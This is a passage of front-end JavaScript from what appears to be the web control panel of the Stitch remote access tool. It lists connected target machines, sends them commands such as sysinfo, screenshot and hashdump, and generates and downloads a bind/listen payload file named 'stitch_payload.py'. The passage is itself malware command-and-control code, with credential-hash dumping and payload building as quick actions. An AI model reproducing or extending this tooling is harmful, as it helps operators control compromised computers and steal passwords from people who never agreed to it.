    }
}

// ============================================
// Pagination Functions
// ============================================

function paginateData(data, page, pageSize) {
    const start = (page - 1) * pageSize;
    const end = start + pageSize;
    return data.slice(start, end);
}

function getTotalPages(totalItems, pageSize) {
    return Math.ceil(totalItems / pageSize) || 1;
}

function renderPaginationControls(containerId, paginationState, loadFunction) {
    const container = document.getElementById(containerId);
    if (!container) return;
    
    const totalPages = getTotalPages(paginationState.totalItems, paginationState.pageSize);
    const currentPage = paginationState.currentPage;
    
    if (paginationState.totalItems === 0) {
        container.innerHTML = '';
        return;
    }
    
    const start = (currentPage - 1) * paginationState.pageSize + 1;
    const end = Math.min(currentPage * paginationState.pageSize, paginationState.totalItems);
    
    container.innerHTML = `
        <div class="pagination-controls" data-load="${loadFunction}">
            <div class="pagination-info">
                Showing ${start}-${end} of ${paginationState.totalItems}
            </div>
            <div class="pagination-buttons">
                <button data-page-action="first" ${currentPage === 1 ? 'disabled' : ''}>⏮️ First</button>
                <button data-page-action="prev" ${currentPage === 1 ? 'disabled' : ''}>◀️ Prev</button>
                <span class="page-number">Page ${currentPage} of ${totalPages}</span>
                <button data-page-action="next" ${currentPage === totalPages ? 'disabled' : ''}>Next ▶️</button>
                <button data-page-action="last" ${currentPage === totalPages ? 'disabled' : ''}>Last ⏭️</button>
            </div>
            <div class="pagination-size">
                <label>Per page:</label>
                <select data-page-size-select>
                    <option value="10" ${paginationState.pageSize === 10 ? 'selected' : ''}>10</option>
                    <option value="25" ${paginationState.pageSize === 25 ? 'selected' : ''}>25</option>
                    <option value="50" ${paginationState.pageSize === 50 ? 'selected' : ''}>50</option>
                    <option value="100" ${paginationState.pageSize === 100 ? 'selected' : ''}>100</option>
                </select>
            </div>
        </div>
    `;
}

function changePage(loadFunction, newPage) {
    if (loadFunction === 'connections') {
        connectionsPagination.currentPage = newPage;
        loadConnections();
    } else if (loadFunction === 'files') {
        filesPagination.currentPage = newPage;
        loadFiles();
    }
}

function changePageSize(loadFunction, newSize) {
    if (loadFunction === 'connections') {
        connectionsPagination.pageSize = parseInt(newSize);
        connectionsPagination.currentPage = 1;
        loadConnections();
    } else if (loadFunction === 'files') {
        filesPagination.pageSize = parseInt(newSize);
        filesPagination.currentPage = 1;
        loadFiles();
    }
}

// ============================================
// CSP-safe event handlers (no inline handlers)
// ============================================
function initializeCSPSafeHandlers() {
    // Category buttons
    document.querySelectorAll('.cat-btn[data-category]').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const category = btn.getAttribute('data-category');
            if (category) showCommands(category);
        });
    });

    // Command buttons
    document.querySelectorAll('.cmd-btn[data-command]').forEach(btn => {
        btn.addEventListener('click', () => {
            const command = btn.getAttribute('data-command');
            const withParams = btn.getAttribute('data-with-params') === 'true';
            if (!command) return;
            if (withParams) {
                executeCommandWithParam(command);
            } else {
                executeCommand(command);
            }
        });
    });

    // Top-level buttons
    const wire = (selector, handler) => {
        const el = document.querySelector(selector);
        if (el) el.addEventListener('click', handler);
    };
    wire('#refreshConnectionsBtn', () => { loadConnections(); loadServerStatus(); });
    wire('#executeCustomBtn', () => executeCustomCommand());
    wire('#copyOutputBtn', () => copyOutput());
    wire('#clearOutputBtn', () => clearOutput());
    wire('#uploadSubmitBtn', () => uploadFile());
    wire('#uploadCancelBtn', () => cancelUpload());
    wire('#generatePayloadBtn', () => generatePayload());
    wire('#resetPayloadBtn', () => resetPayloadForm());
    wire('#downloadPayloadBtn', () => downloadPayload());
    wire('#copyPayloadInfoBtn', () => copyPayloadInfo());
    wire('#refreshLogsBtn', () => loadLogs());
    wire('#clearLogsBtn', () => clearDebugLogs());

    // Export buttons via delegation
    const exportContainer = document.querySelector('.export-buttons');
    if (exportContainer) {
        exportContainer.addEventListener('click', (e) => {
            const btn = e.target.closest('button[data-export-type]');
            if (!btn) return;
            const type = btn.getAttribute('data-export-type');
            const format = btn.getAttribute('data-format');
            if (type === 'logs') exportLogs(format);
            if (type === 'commands') exportCommandHistory(format);
        });
    }

    // Search inputs
    const connSearch = document.getElementById('connectionsSearch');
    if (connSearch) connSearch.addEventListener('input', filterConnections);
    const connFilter = document.getElementById('connectionsFilter');
    if (connFilter) connFilter.addEventListener('change', filterConnections);
    const filesSearch = document.getElementById('filesSearch');
    if (filesSearch) filesSearch.addEventListener('input', filterFiles);

    // Pagination controls (delegation)
    const setupPaginationDelegation = (containerId, state, key) => {
        const container = document.getElementById(containerId);
        if (!container) return;
        container.addEventListener('click', (e) => {
            const btn = e.target.closest('button[data-page-action]');
            if (!btn) return;
            const action = btn.getAttribute('data-page-action');
            const totalPages = getTotalPages(state.totalItems, state.pageSize);
            if (action === 'first') changePage(key, 1);
            if (action === 'prev') changePage(key, Math.max(1, (key === 'connections' ? connectionsPagination.currentPage : filesPagination.currentPage) - 1));
            if (action === 'next') changePage(key, Math.min(totalPages, (key === 'connections' ? connectionsPagination.currentPage : filesPagination.currentPage) + 1));
            if (action === 'last') changePage(key, totalPages);
        });
        container.addEventListener('change', (e) => {
            const select = e.target.closest('select[data-page-size-select]');
            if (!select) return;
            changePageSize(key, select.value);
        });
    };
    setupPaginationDelegation('connectionsPaginationControls', connectionsPagination, 'connections');
    setupPaginationDelegation('filesPaginationControls', filesPagination, 'files');

    // Connections grid delegation (select + quick actions)
    const connectionsGrid = document.getElementById('connectionsGrid');
    if (connectionsGrid) {
        connectionsGrid.addEventListener('click', (e) => {
            const quickBtn = e.target.closest('[data-quick]');
            if (quickBtn) {
                const card = quickBtn.closest('.connection-card');
                if (!card) return;
                const connId = card.getAttribute('data-connection-id');
                const hostname = card.getAttribute('data-hostname') || connId;
                const status = card.getAttribute('data-status') || 'offline';
                selectConnection(connId, hostname, status);
                const action = quickBtn.getAttribute('data-quick');
                if (action === 'commands') {
                    showSection('commands');
                } else if (action === 'info') {
                    showSection('commands');
                    executeCommand('sysinfo');
                } else if (action === 'screen') {
                    showSection('commands');
                    executeCommand('screenshot');
                } else if (action === 'hashdump') {
                    showSection('commands');
                    executeCommand('hashdump');
                }
                return;
            }

            const card = e.target.closest('.connection-card');
            if (card) {
                const connId = card.getAttribute('data-connection-id');
                const hostname = card.getAttribute('data-hostname') || connId;
                const status = card.getAttribute('data-status') || 'offline';
                selectConnection(connId, hostname, status);
            }
        });
    }
}

// Update persistent target indicator in navigation
function updateTargetIndicator(hostname, status) {
    let indicator = document.getElementById('targetIndicator');
    if (!indicator) {
        // Create indicator if it doesn't exist
        const sidebar = document.querySelector('.sidebar-footer');
        indicator = document.createElement('div');
        indicator.id = 'targetIndicator';
        indicator.className = 'target-indicator';
        sidebar.insertBefore(indicator, sidebar.firstChild);
    }
    
    const statusIcon = status === 'online' ? '🎯' : '⚫';
    const statusClass = status === 'online' ? 'online' : 'offline';
    indicator.className = `target-indicator ${statusClass}`;
    indicator.innerHTML = `
        <div class="indicator-label">ACTIVE TARGET</div>
        <div class="indicator-value">${statusIcon} ${hostname}</div>
    `;
}

// Payload Generation Functions
async function generatePayload() {
    const form = document.getElementById('payloadForm');
    const outputDiv = document.getElementById('payloadOutput');
    const infoDiv = document.getElementById('payloadInfo');
    
    // Get form data
    const enableBind = document.getElementById('enableBind').checked;
    const bindHost = document.getElementById('bindHost').value.trim();
    const bindPort = document.getElementById('bindPort').value;
    const enableListen = document.getElementById('enableListen').checked;
    const listenHost = document.getElementById('listenHost').value.trim();
    const listenPort = document.getElementById('listenPort').value;
    
    // Validation
    if (!enableBind && !enableListen) {
        showToast('At least one mode (Bind or Listen) must be enabled', 'error');
        return;
    }
    
    // Show loading
    infoDiv.innerHTML = '<div class="loading-spinner"></div><p>Generating payload...</p>';
    outputDiv.style.display = 'block';
    
    try {
        const response = await fetch('/api/generate-payload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': getCSRFToken()
            },
            body: JSON.stringify({
                enable_bind: enableBind,
                bind_host: bindHost,
                bind_port: parseInt(bindPort),
                enable_listen: enableListen,
                listen_host: listenHost,
                listen_port: parseInt(listenPort)
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            infoDiv.innerHTML = `
                <div class="success-box">
                    <h4>✅ Payload Generated Successfully</h4>
                    <p><strong>Size:</strong> ${formatBytes(result.payload_size)}</p>
                    <p><strong>Configuration:</strong></p>
                    <ul>
                        ${result.config.enable_bind ? `<li>Bind: ${result.config.bind_host || 'any'}:${result.config.bind_port}</li>` : ''}
                        ${result.config.enable_listen ? `<li>Listen: ${result.config.listen_host}:${result.config.listen_port}</li>` : ''}
                    </ul>
                </div>
            `;
            showToast('Payload generated successfully!', 'success');
        } else {
            infoDiv.innerHTML = `
                <div class="error-box">
                    <h4>❌ Generation Failed</h4>
                    <p>${result.error}</p>
                </div>
            `;
            showToast(`Generation failed: ${result.error}`, 'error');
        }
    } catch (error) {
        infoDiv.innerHTML = `
            <div class="error-box">
                <h4>❌ Network Error</h4>
                <p>${error.message}</p>
            </div>
        `;
        showToast('Network error during generation', 'error');
    }
}

async function downloadPayload() {
    try {
        const response = await fetch('/api/download-payload', {
            headers: {
                'X-CSRFToken': getCSRFToken()
            }
        });
        
        if (response.ok) {
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'stitch_payload.py';
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
            
            showToast('Payload downloaded successfully', 'success');
        } else {
            const error = await response.json();
            showToast(`Download failed: ${error.error}`, 'error');
        }
    } catch (error) {
        showToast('Download error occurred', 'error');
    }
}

function resetPayloadForm() {
    document.getElementById('enableBind').checked = true;
    document.getElementById('bindHost').value = '';
    document.getElementById('bindPort').value = '4433';
    document.getElementById('enableListen').checked = true;
    document.getElementById('listenHost').value = 'localhost';
    document.getElementById('listenPort').value = '4455';
    document.getElementById('payloadOutput').style.display = 'none';
}

function copyPayloadInfo() {
    const infoDiv = document.getElementById('payloadInfo');
    const text = infoDiv.textContent || infoDiv.innerText;
    
    if (navigator.clipboard) {
        navigator.clipboard.writeText(text).then(() => {
            showToast('Payload info copied to clipboard', 'success');
        });
    } else {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        showToast('Payload info copied to clipboard', 'success');
    }
}
